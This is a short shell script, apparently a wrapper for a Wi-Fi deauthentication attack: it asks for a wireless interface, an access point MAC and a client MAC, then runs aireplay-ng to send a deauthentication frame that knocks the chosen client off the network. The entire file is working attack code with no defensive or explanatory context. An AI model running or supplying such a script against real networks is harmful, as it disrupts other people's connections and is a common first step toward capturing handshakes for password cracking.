#!/bin/sh
echo "interface?"
read myinterface &&
echo "accessmac"
read amac &&
echo "clientmac"
read cmac &&
aireplay-ng -0 1 -a $amac -c $cmac  $myinterface
